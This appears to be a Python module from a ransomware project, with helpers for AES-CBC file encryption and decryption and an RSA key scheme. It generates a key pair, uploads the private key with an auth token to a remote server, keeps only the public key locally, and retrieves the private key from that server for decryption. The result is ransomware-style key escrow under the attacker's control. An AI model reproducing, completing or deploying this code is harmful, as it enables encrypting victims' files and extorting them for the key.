from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.asymmetric import padding as p
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from base64 import b64encode
import hashlib, hmac, constants, os, sys, requests

def pad(msg):

	padder = padding.PKCS7(constants.BLOCK_SIZE_BITS).padder()
	padded_data = padder.update(msg)
	padded_data += padder.finalize()
	return padded_data

def oaep():
	return p.OAEP(
		mgf=p.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)

def unpad(msg):

    unpadder = padding.PKCS7(constants.BLOCK_SIZE_BITS).unpadder()
    data = unpadder.update(msg)
    data += unpadder.finalize()
    return data

def HMAC(data, key):
    return hmac.new(key, data, hashlib.sha256).hexdigest()

def FileEncryptor(key, iv):
	return Cipher(
        algorithms.AES(key), 
        modes.CBC(iv), 
        backend=default_backend()).encryptor()

def FileDecryptor(key, iv):
    return Cipher(
        algorithms.AES(key), 
        modes.CBC(iv), 
        backend=default_backend()).decryptor()

def RSAEncryptor():
    return GenKeyPair()
    
def RSADecryptor():
    pub_key_file = open(constants.RSA_PUBLIC_KEY_FILE, 'rb')
    publicKey = pub_key_file.read()
    pub_key_file.close()
    privateKey = GetRequest(constants.URL + '/retrieve/', publicKey)
    if 'exist' in str(privateKey).lower():
        sys.exit(1)
    return serialization.load_pem_private_key(
        privateKey,
        password=None,
        backend=default_backend())

def GenKeyPair():
    private_key = rsa.generate_private_key(
        public_exponent = constants.EXPONENT,
        key_size = constants.RSA_LENGTH_OF_KEY,
        backend = default_backend()
    )
    private_key_raw = private_key.private_bytes(
        encoding = serialization.Encoding.PEM,
        format = serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm = serialization.NoEncryption()
    )

    public_key = private_key.public_key()

    public_key_raw = public_key.public_bytes(
        encoding = serialization.Encoding.PEM,
        format = serialization.PublicFormat.SubjectPublicKeyInfo
    )

    PostRequest(constants.URL + '/post/', public_key_raw, private_key_raw)

    with open(constants.RSA_PUBLIC_KEY_FILE, 'wb') as pub:
        pub.write(public_key_raw)

    return public_key

def PostRequest(request, publicKey, privateKey):
    body = {
        'publicKey' : publicKey,
        'privateKey' : privateKey
    }
    header = {"Authorization" : constants.TOKEN}
    return requests.post(request, body, headers=header)

def GetRequest(request, publicKey):
    header = {"Authorization" : constants.TOKEN}
    body = {'publicKey' : publicKey}
    content = requests.post(request, body, headers=header).content
    return content
